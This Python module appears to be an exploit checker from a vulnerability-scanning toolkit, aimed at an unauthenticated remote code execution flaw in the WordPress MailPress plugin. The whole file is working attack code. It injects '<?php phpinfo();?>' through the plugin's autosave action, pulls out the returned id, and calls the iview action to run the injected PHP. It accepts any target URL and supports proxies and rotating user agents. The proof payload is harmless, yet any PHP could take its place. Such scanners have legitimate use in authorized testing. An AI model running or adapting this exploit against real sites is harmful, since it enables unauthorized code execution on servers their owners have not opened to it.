#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress 插件mailpress远程代码执行
referer: http://0day5.com/archives/3960
author: Ascotbe
reference: Lucifer
description: Mailpress存在越权调用，在不登陆的情况下，可以调用系统某些方法，造成远程命令执行。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/wp-content/plugins/mailpress/mp-includes/action.php"

post_data = {
    "action":"autosave",
    "id":0,
    "revision":-1,
    "toemail":"",
    "toname":"",
    "fromemail":"",
    "fromname":"",
    "to_list":1,
    "Theme":"",
    "subject":"<?php phpinfo();?>",
    "html":"",
    "plaintext":"",
    "mail_format":"standard",
    "autosave":1,
}
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
            con = resp.text
            start = con.find("<autosave id=")
            end = con.find("old_id")
            searchkey = con[start:end].strip()
            searchid = searchkey.lstrip("<autosave id='").rstrip("'")
            shellurl = scheme+"://"+url + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" + searchid
            resp2=requests.get(shellurl, headers=headers, timeout=10, proxies=proxies, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
            con = resp.text
            start = con.find("<autosave id=")
            end = con.find("old_id")
            searchkey = con[start:end].strip()
            searchid = searchkey.lstrip("<autosave id='").rstrip("'")
            shellurl = scheme+"://"+url + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" + searchid
            resp2=requests.get(shellurl, headers=headers, timeout=10, verify=False)
        con2 = resp2.text
        code = resp.status_code
        if  con2.lower().find('configuration file (php.ini) path')!=-1:
            Medusa = "{} 存在wordpress 插件mailpress远程代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            return (Medusa)
    except Exception as e:
        pass